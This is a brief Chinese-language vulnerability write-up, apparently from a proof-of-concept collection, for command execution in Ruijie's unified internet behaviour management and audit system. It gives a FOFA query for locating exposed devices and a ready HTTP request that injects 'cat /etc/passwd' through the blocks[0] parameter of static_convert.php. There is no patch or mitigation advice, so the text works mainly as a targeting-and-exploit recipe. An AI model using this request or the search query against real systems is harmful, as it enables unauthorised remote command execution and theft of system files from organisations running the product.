# 锐捷统一上网行为管理与审计系统 命令执行

### 1.漏洞描述

锐捷统一上网行为管理与审计系统是一种专业的网络管理解决方案，旨在帮助组织监控和管理网络使用。通过精确的流量控制和详尽的审计功能，系统能够实时分析和记录用户的上网行为，保障网络安全和资源合理利用。它支持多种认证方式和策略配置，提供强大的报表生成和统计分析功能，帮助管理员有效管理带宽、优化网络性能，确保网络环境的稳定与安全。

### 2.fofa语法

```plain
body="/api/statistics/service-usage-amount"
```

### 3.漏洞复现

```plain
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719316022900-f2e85f1b-46e0-4cf2-8ecc-60eb8df0537a.png)